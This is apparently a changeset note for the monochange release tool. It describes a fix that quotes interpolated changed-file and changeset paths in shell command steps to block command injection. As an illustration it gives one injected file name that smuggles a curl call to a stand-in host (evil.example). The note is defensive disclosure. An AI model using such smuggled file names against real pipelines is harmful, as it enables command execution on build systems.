---
monochange: fix
---

# Quote interpolated release paths in shell command steps

`Command` steps that use `{{ changed_files }}` or `{{ changesets }}` now quote each path with POSIX single quotes before the command runs. A changeset or changed-file name is repository content a merged pull request controls, so a name like `feature'; curl evil.example; '.md` previously expanded into the command string verbatim; in a `shell = true` step that could execute as separate commands. Both the shell path (`sh -c`) and the default no-shell path (`shlex` splitting) decode the same quoting, so commands keep receiving the original paths — including paths containing spaces, which now survive no-shell steps as a single argument.

Scalar values such as `{{ version }}` are unchanged, and `when` conditions plus step inputs still see raw paths. Configs that read raw path data through the structured `release.*` namespaces opt into unquoted values explicitly.
